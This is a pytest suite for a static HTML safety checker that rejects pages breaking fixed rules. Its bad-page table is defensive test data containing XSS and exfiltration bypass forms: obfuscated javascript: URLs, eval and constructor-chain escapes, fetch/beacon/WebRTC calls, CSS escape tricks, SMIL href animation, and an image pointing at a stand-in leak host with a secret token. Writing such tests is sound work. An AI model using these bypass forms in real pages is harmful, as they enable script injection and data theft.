"""WEB-1 / WS-02 to WS-09 (contracts/website.rules.md): the static checker for a native website's HTML.
`check_website(bytes) -> WebsiteCheck(ok, code, line)`: stdlib only, no model. A good corpus passes (a live
multi-timezone clock among it) and one bad page per rule is refused with its fixed code and a line number. The reason
never quotes the file."""

from __future__ import annotations

import pytest
from tilo_memory.website_check import MAX_BYTES, WebsiteCheck, check_website

CLOCKS = """<!DOCTYPE html>
<html lang="en"><head><meta charset="utf-8"><meta name="viewport" content="width=device-width, initial-scale=1">
<title>World clocks</title>
<style>
  body { margin: 0; font: 16px system-ui; background: #0b1020; color: #e8ecff }
  .grid { display: grid; grid-template-columns: repeat(auto-fill, minmax(180px, 1fr)); gap: 8px; padding: 12px }
  .card { position: relative; top: 2px; padding: 12px; border-radius: 8px; background: rgba(255,255,255,.06) }
  .t { font-size: 28px; font-variant-numeric: tabular-nums }
</style></head>
<body><h1 id="hero">Time around the world</h1><p>See example.com/zones for the list.</p>
<div class="grid" id="grid"></div>
<img alt="dot" src="data:image/png;base64,iVBORw0KGgo=">
<a href="#hero">Back to top</a>
<script>
const zones = ["UTC", "Asia/Kolkata", "America/New_York", "Europe/London", "Asia/Tokyo"];
const grid = document.getElementById("grid");
for (const z of zones) {
  const card = document.createElement("div");
  card.className = "card";
  card.innerHTML = '<div class="n"></div><div class="t"></div>';
  card.querySelector(".n").textContent = z;
  grid.appendChild(card);
}
function tick() {
  zones.forEach((z, i) => {
    const t = new Intl.DateTimeFormat("en-GB", {timeZone: z, hour: "2-digit", minute: "2-digit", second: "2-digit"});
    grid.children[i].querySelector(".t").textContent = t.format(new Date());
  });
  grid.style.top = "0px";
}
tick(); setInterval(tick, 1000);
</script></body></html>
"""


def page(body: str = "", head: str = "") -> bytes:
    return f"<!doctype html>\n<html><head><meta charset=utf-8>{head}</head><body>\n{body}\n</body></html>\n".encode()


def check(data: bytes | str) -> WebsiteCheck:
    return check_website(data.encode() if isinstance(data, str) else data)


def test_WEB_1_WS_03_a_live_multi_timezone_clock_passes() -> None:
    result = check(CLOCKS)
    assert result == WebsiteCheck(True, None, None)


@pytest.mark.parametrize(
    "body",
    [
        '<a href="">x</a><a href="#top-1">y</a><a href="#">z</a>',
        '<img src="data:image/webp;base64,AAAA">',
        '<img srcset="data:image/png;base64,AA 1x, data:image/gif;base64,BB 2x">',
        '<div style="background:url(data:image/png;base64,AAAA)">x</div>',
        "<audio src='data:audio/mpeg;base64,AAAA'></audio><video poster=data:image/jpeg;base64,AA></video>",
        "<button onclick=\"document.title='x'\">go</button><p>a &amp; b &lt; c</p>",
        "<script>class A { constructor() { this.x = 1 } } el.style.top = '1px'; a?.open;</script>",
        "<style>@font-face{font-family:f;src:url(data:font/woff2;base64,AAAA)}</style>",
        "<script>const important = 1; /* important is not the keyword */</script>",
        "<script>let startClock = 1, chartCanvas = 2, shortcut = 3;</script>",  # "rtc" inside a word is fine
        '<svg><rect fill="url(#g)" stroke="red" mask="url(#m)"/><linearGradient id="g"/></svg>',
        "<style>/* don't panic */ p{content:\"it's\"; font-family:'A B'}</style>",
        '<input type=text autocomplete=off><input type="email" autocomplete="email">',
    ],
)
def test_WEB_1_WS_05_WS_07_allowed_forms_pass(body: str) -> None:
    assert check(page(body)).ok, check(page(body))


# one bad page per rule: (id, expected code, bytes)
BAD = {
    "WS-02_empty": ("ws_size", b""),
    "WS-02_over_cap": ("ws_size", b"<!doctype html><p>" + b"a" * MAX_BYTES + b"</p>"),
    "WS-02_bom": ("ws_encoding", b"\xef\xbb\xbf" + page("<p>x</p>")),
    "WS-02_not_utf8": ("ws_encoding", b"<!doctype html><p>\xff\xfe</p>"),
    "WS-02_nul": ("ws_encoding", page("<p>a\x00b</p>")),
    "WS-02_c0": ("ws_encoding", page("<p>a\x1bb</p>")),
    "WS-02_no_doctype": ("ws_encoding", b"<html><body>x</body></html>"),
    "WS-04_base": ("ws_element", page(head='<base href="#x">')),
    "WS-04_google_fonts_head": (
        "ws_element",
        page(
            head='<link rel="preconnect" href="https://fonts.googleapis.com">'
            '<link href="https://fonts.googleapis.com/css2?family=Inter&display=swap" rel="stylesheet">'
        ),
    ),
    "WS-04_link": ("ws_element", page(head='<link rel="stylesheet" href="#x">')),
    "WS-04_iframe": ("ws_element", page("<iframe></iframe>")),
    "WS-04_object": ("ws_element", page("<object></object>")),
    "WS-04_embed": ("ws_element", page("<embed>")),
    "WS-04_form": ("ws_element", page("<form></form>")),
    "WS-04_meta_refresh": ("ws_element", page(head='<meta http-equiv="refresh" content="0">')),
    "WS-04_meta_other": ("ws_element", page(head='<meta name="author" content="a">')),
    "WS-04_script_src": ("ws_element", page('<script src="data:text/javascript,1"></script>')),
    "WS-04_script_module": ("ws_element", page('<script type="module">1</script>')),
    "WS-04_a_target": ("ws_element", page('<a href="#x" target="_blank">x</a>')),
    "WS-04_a_download": ("ws_element", page('<a href="#x" download>x</a>')),
    "WS-04_srcdoc": ("ws_element", page('<div srcdoc="x"></div>')),
    "WS-03_unclosed_tag": ("ws_element", b"<!doctype html><p>x</p><div class='a"),
    "WS-03_unclosed_comment": ("ws_element", page("<p>x</p><!-- never closed")),
    "WS-03_unclosed_script": ("ws_element", b"<!doctype html><script>var a = 1;"),
    "WS-03_unclosed_style": ("ws_element", b"<!doctype html><style>p{color:red}"),
    "WS-03_cdata_section": ("ws_element", page("<![CDATA[ > <script>x()</script> ]]>")),
    "WS-03_comment_bang_end": ("ws_element", page("<!-- x --!><script>y()</script>")),
    "WS-05_https": ("ws_url", page('<a href="https://example.com">x</a>')),
    "WS-05_relative": ("ws_url", page('<img src="logo.png">')),
    "WS-05_proto_relative": ("ws_url", page('<img src="//cdn.example/x.png">')),
    "WS-05_javascript_charref": ("ws_url", page('<a href="&#106;avascript:alert(1)">x</a>')),
    "WS-05_javascript_tab": ("ws_url", page('<a href="java&#9;script:alert(1)">x</a>')),
    "WS-05_data_html": ("ws_url", page('<a href="data:text/html;base64,AAAA">x</a>')),
    "WS-05_data_svg": ("ws_url", page('<img src="data:image/svg+xml;base64,AAAA">')),
    "WS-05_srcset_second": ("ws_url", page('<img srcset="data:image/png;base64,AA 1x, other.png 2x">')),
    "WS-05_repeated_attribute": ("ws_url", page('<a href="other.html" href="#x">x</a>')),
    "WS-05_action": ("ws_url", page('<button formaction="">x</button>')),
    "WS-05_blob": ("ws_url", page('<video src="blob:abc"></video>')),
    "WS-06_import": ("ws_css", page(head="<style>@import 'a.css';</style>")),
    "WS-06_import_escaped": ("ws_css", page(head="<style>@\\69mport 'a.css';</style>")),
    "WS-06_url_relative": ("ws_css", page(head="<style>p{background:url(a.png)}</style>")),
    "WS-06_url_escaped": ("ws_css", page(head='<style>p{background:\\75rl("a.png")}</style>')),
    "WS-06_style_attr": ("ws_css", page('<p style="background:url(a.png)">x</p>')),
    "WS-06_expression": ("ws_css", page('<p style="width:expression(1)">x</p>')),
    "WS-06_binding": ("ws_css", page(head="<style>p{-moz-binding:none}</style>")),
    "WS-07_fetch": ("ws_script", page("<script>fetch('a')</script>")),
    "WS-07_xhr": ("ws_script", page("<script>new XMLHttpRequest()</script>")),
    "WS-07_websocket": ("ws_script", page("<script>new WebSocket('a')</script>")),
    "WS-07_beacon": ("ws_script", page("<script>navigator.sendBeacon('a')</script>")),
    "WS-07_eval": ("ws_script", page("<script>eval('1')</script>")),
    "WS-07_function": ("ws_script", page("<script>new Function('1')()</script>")),
    "WS-07_postmessage": ("ws_script", page("<script>x.postMessage(1)</script>")),
    "WS-07_import": ("ws_script", page("<script>import('x')</script>")),
    "WS-07_ctor_chain": ("ws_script", page("<script>[]['constructor']</script>")),
    "WS-07_ctor_dot": ("ws_script", page("<script>x.constructor.y</script>")),
    "WS-07_location": ("ws_script", page("<script>location = '#a'</script>")),
    "WS-07_window_location": ("ws_script", page("<script>window.location.href = '#a'</script>")),
    "WS-07_top": ("ws_script", page("<script>top.x = 1</script>")),
    "WS-07_open": ("ws_script", page("<script>open('#a')</script>")),
    "WS-07_history": ("ws_script", page("<script>history.back()</script>")),
    "WS-07_cookie": ("ws_script", page("<script>document.cookie = 'a'</script>")),
    "WS-07_document_write": ("ws_script", page("<script>document.write('a')</script>")),
    "WS-07_window_bracket": ("ws_script", page("<script>window['x']</script>")),
    "WS-07_timeout_string": ("ws_script", page("<script>setTimeout('x()', 1)</script>")),
    "WS-07_handler": ("ws_script", page('<p onclick="fetch(1)">x</p>')),
    "WS-07_handler_entity": ("ws_script", page('<p onclick="&#102;etch(1)">x</p>')),
    "WS-07_unicode_escape": ("ws_script", page("<script>\\u0066etch(1)</script>")),
    "WS-07_script_double_escape_comment": ("ws_script", page("<script>var a = '<!--'; </script>")),
    "WS-07_script_double_escape_tag": ("ws_script", page("<script>var a = '<SCRIPT>'; </script>")),
    "WS-07_rtc_vendor": ("ws_script", page("<script>new webkitRTCPeerConnection()</script>")),
    "WS-07_rtc_datachannel": ("ws_script", page("<script>var c = RTCDataChannel</script>")),
    "WS-07_rtc_lowercase": ("ws_script", page("<script>var c = rtcpeer</script>")),
    "WS-06_unclosed_quote_in_url": ("ws_css", page(head='<style>p{background:url("data:image/png;base64,AA)}</style>')),
    "WS-06_unclosed_quote_in_image_set": ("ws_css", page(head="<style>p{background:image-set('a.png 1x)}</style>")),
    "WS-06_unclosed_quote_in_style_attr": ("ws_css", page("<p style='background:url(\"a'>x</p>")),
    "WS-06_svg_fill_url": ("ws_css", page('<svg><rect fill="url(a.png)"/></svg>')),
    "WS-06_svg_mask_url": ("ws_css", page('<svg><rect mask="url(b.svg#m)"/></svg>')),
    "WS-06_svg_filter_url": ("ws_css", page('<svg><rect filter="url(&quot;c.svg#f&quot;)"/></svg>')),
    "WS-06_svg_cursor_url": ("ws_css", page('<svg><rect cursor="url(d.cur), auto"/></svg>')),
    "WS-04_smil_set_href": ("ws_element", page('<svg><a><set attributeName="href" to="#x"/></a></svg>')),
    "WS-04_smil_animate_xlink": (
        "ws_element",
        page('<svg><a><animate attributeName=" XLink:Href " to="#x"/></a></svg>'),
    ),
    "WS-04_smil_animate_transform_href": (
        "ws_element",
        page('<svg><a><animateTransform attributeName="href"/></a></svg>'),
    ),
    "WS-06_smil_to_url": ("ws_css", page('<svg><rect><set attributeName="fill" to="url(e.png)"/></rect></svg>')),
    "WS-04_password_input": ("ws_element", page("<input type=password>")),
    "WS-04_password_input_case_space": ("ws_element", page('<INPUT TYPE=" PassWord ">')),
    "WS-04_autocomplete_current_password": ("ws_element", page('<input autocomplete="username current-password">')),
    "WS-04_autocomplete_new_password": ("ws_element", page("<input autocomplete=NEW-PASSWORD>")),
    "WS-03_giant_character_reference": ("ws_raw", page("<p>&#" + "1" * 5000 + ";</p>")),
    "WS-08_scheme_in_text": ("ws_raw", page("<p>see https://example.com</p>")),
    "WS-08_scheme_entity": ("ws_raw", page("<p>see x&#58;//example.com</p>")),
    "WS-08_javascript_in_text": ("ws_raw", page("<p>javascript:alert(1)</p>")),
    "WS-08_data_html_in_text": ("ws_raw", page("<p>DATA:TEXT/HTML,x</p>")),
    "WS-08_import_in_text": ("ws_raw", page("<p>@import</p>")),
}


@pytest.mark.parametrize("name", sorted(BAD))
def test_WEB_1_WS_09_one_bad_page_per_rule_is_refused_with_its_code(name: str) -> None:
    code, data = BAD[name]
    result = check(data)
    assert result.ok is False and result.code == code, (name, result)
    assert result.code in {
        "ws_size",
        "ws_encoding",
        "ws_element",
        "ws_url",
        "ws_css",
        "ws_script",
        "ws_raw",
    }


def test_WEB_1_WS_09_the_reason_has_a_line_number_and_never_quotes_the_file() -> None:
    data = (
        b"<!doctype html>\n<html>\n<body>\n<p>ok</p>\n<img src='https://leak.example/SECRET-token'>\n</body></html>\n"
    )
    result = check(data)
    assert result.code == "ws_url" and result.line == 5
    assert "SECRET" not in repr(result) and "leak" not in repr(result)


def test_WEB_1_WS_02_exactly_the_cap_passes_and_one_more_byte_fails() -> None:
    head, tail = b"<!doctype html><p>", b"</p>"
    fill = MAX_BYTES - len(head) - len(tail)
    assert MAX_BYTES == 524_288
    assert check(head + b"a" * fill + tail).ok
    assert check(head + b"a" * (fill + 1) + tail).code == "ws_size"


def test_WEB_1_WS_02_doctype_is_case_insensitive_and_whitespace_may_come_first() -> None:
    assert check(b"\n  \t<!DocType HTML><p>x</p>").ok


def test_WEB_1_WS_03_a_tag_flood_is_refused_quickly_not_quadratically() -> None:
    import time

    started = time.monotonic()
    result = check(b"<!doctype html>" + b"<a " * 150_000)
    assert result.ok is False
    assert time.monotonic() - started < 5


def hostile(opening: str, unit: str, closing: str) -> bytes:
    """A page of exactly the 512 KB cap: `opening`, `unit` repeated to fill, `closing`. The checker holds the GIL for
    the whole call, so every rule must be linear."""
    head, tail = "<!doctype html><html><body>", "</body></html>"
    room = MAX_BYTES - len(head) - len(tail) - len(opening) - len(closing)
    return (head + opening + (unit * (room // len(unit) + 1))[:room] + closing + tail).encode()


HOSTILE = {
    "spaces_after_window": ("<script>window", " ", "</script>"),
    "windows_and_spaces": ("<script>", "window  ", "</script>"),
    "dots_and_spaces": ("<script>", ".  ", "</script>"),
    "deep_url": ("<style>", "url(", "</style>"),
    "deep_image_set": ("<style>", "image-set(", "</style>"),
    "deep_src_spaces": ("<style>", "src(  ", "</style>"),
    "unclosed_quotes": ("<style>", 'url("a', "</style>"),
    "many_style_strings": ("<style>a{content:", '"x" ', "}</style>"),
    "many_comments": ("", "<!-- c -->\n", ""),
    "many_comments_one_line": ("", "<!-- c -->", ""),
    "many_long_lines_comments": ("", "<!--" + "x" * 30 + "-->\n", ""),
    "paren_flood": ("<style>", "(", "</style>"),
    "many_expression_words": ("<style>", "expression ", "</style>"),
    "many_css_comments": ("<style>", "/* c */\n", "</style>"),
    "many_style_attrs": ("", '<i style="a:url(\'">', ""),
}


@pytest.mark.parametrize("name", sorted(HOSTILE))
def test_WEB_1_WS_03_a_hostile_512_kb_page_is_judged_in_under_two_seconds(name: str) -> None:
    import time

    data = hostile(*HOSTILE[name])
    started = time.monotonic()
    result = check_website(data)
    assert time.monotonic() - started < 2, (name, result)
    assert isinstance(result.ok, bool)
